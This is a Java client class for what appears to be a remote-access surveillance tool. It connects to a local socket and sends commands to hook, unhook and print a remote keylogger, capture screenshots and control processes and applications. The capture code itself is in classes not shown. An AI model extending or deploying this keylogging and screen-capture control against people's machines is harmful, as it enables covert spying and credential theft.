package model;

import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

public class Client
{
    public Client()
    {
        initComponents();
    }

    private void initComponents()
    {
        //
    }

    public String createSocket()
    {
        try
        {
            sock = new Socket(InetAddress.getLocalHost(), 9998);

            inputStream = sock.getInputStream();
            outputStream = sock.getOutputStream();
            process = new Process(sock, inputStream, outputStream);
            keylogger = new Keylogger(inputStream, outputStream);
            screenShot = new Screenshot(inputStream, outputStream);
            application = new Application(sock, inputStream, outputStream);
        }
        catch (Exception e)
        {
            return e.toString();
        }

        return "Success";
    }

    public void setIP(String IP) {
        this.IP = IP;
    }

    public BufferedImage handleScreenShot(String command)
    {
        sendCommand(command);

        return screenShot.takeScreenshot();
    }

    public String handleKeyLogger(String command)
    {
        sendCommand(command);
        switch(command)
        {
            case "Hook":
                keylogger.handleHook();
                break;
            case "Unhook":
                keylogger.handleUnHook();
                break;
            case "Print":
                return keylogger.handlePrint();
        }

        return keylogger.getKeylogging();
    }

    public Screenshot getScreenShot() {
        return screenShot;
    }

    public Process getProcess() {
        return process;
    }

    public Keylogger getKeylogger() {
        return keylogger;
    }

    public Application getApplication() {
        return application;
    }

    public void sendCommand(String command)
    {
        try
        {
            byte[] msg = command.getBytes();
            outputStream.write(msg);
        }
        catch (IOException ioE)
        {
            //
        }
    }

    private Boolean isHook = false;
    private Socket sock;
    private String IP;
    private InputStream inputStream;
    private OutputStream outputStream;
    private Process process;
    private Keylogger keylogger;
    private Screenshot screenShot;
    private Application application;
}